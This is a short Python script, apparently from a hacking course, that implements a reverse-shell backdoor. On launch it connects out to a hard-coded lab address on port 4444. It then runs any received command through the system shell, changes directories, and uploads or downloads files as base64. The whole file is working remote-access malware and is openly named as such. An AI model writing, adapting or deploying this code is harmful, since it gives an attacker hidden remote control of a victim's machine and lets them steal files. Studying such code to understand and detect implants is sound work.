#!/usr/bin/env python3

import base64  # https://docs.python.org/3/library/base64.html
import json  # https://docs.python.org/3/library/json.html
import os  # https://docs.python.org/3/library/os.html
import socket  # https://docs.python.org/3/library/socket.html
import subprocess  # https://docs.python.org/3/library/subprocess.html
# import sys  # https://docs.python.org/3/library/sys.html


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        # Serialisation
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Change working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Succesful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        command_result = ""

        while True:
            command = self.reliable_receive()

            # noinspection PyBroadException
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = "[-] Error during command execution"

            self.reliable_send(command_result)


# Main
if __name__ == "__main__":
    my_backdoor = Backdoor("192.168.122.108", 4444)
    my_backdoor.run()
